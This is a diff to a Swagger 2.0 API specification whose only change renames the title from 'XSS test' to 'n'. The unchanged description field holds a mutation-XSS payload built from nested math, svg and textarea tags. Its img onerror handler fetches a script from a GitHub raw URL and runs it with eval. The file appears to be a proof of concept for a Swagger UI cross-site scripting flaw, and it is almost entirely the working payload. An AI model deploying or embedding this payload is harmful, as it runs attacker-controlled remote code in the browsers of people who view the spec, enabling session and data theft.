@@ -1,5 +1,5 @@
 swagger: '2.0'
 info:
-  title: XSS test
+  title: n
   description: <math><mtext><h1><a><h6></a></h6>&lt;mglyph&gt;<svg><mtext><textarea><a title='</textarea><img src onerror=fetch(`https://raw.githubusercontent.com/VictorNS69/swagger-ui-xss/main/script.js`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1>">"</textarea></desc></textarea></mtext></mtext></svg>&lt;/mglyph&gt;</option></mtext></math>
   version: production
